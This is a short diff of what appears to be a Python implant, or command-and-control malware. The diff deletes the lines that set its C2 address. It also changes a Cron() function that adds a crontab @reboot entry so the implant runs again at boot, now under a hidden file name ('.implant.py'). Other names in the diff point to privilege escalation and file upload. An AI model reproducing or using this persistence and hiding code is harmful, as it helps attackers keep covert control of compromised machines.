@@ -12,8 +12,6 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 
 #Comms
-c2 = 'http://localhost:63412'
-c2IPAdress = 'localhost'
 implantDir = os.getcwd()
 
 #This will upload a file to the target server.
@@ -106,7 +104,7 @@ def PrivEsc(implantDir):
     return
 
 def Cron():
-    os.system(f'echo "@reboot /usr/bin/python3 {implantDir}/implant.py" > text.txt');
+    os.system(f'echo "@reboot /usr/bin/python3 {implantDir}/.implant.py" > text.txt');
     os.system(f'crontab {implantDir}/text.txt')
     os.system(f'rm {implantDir}/text.txt')
     return
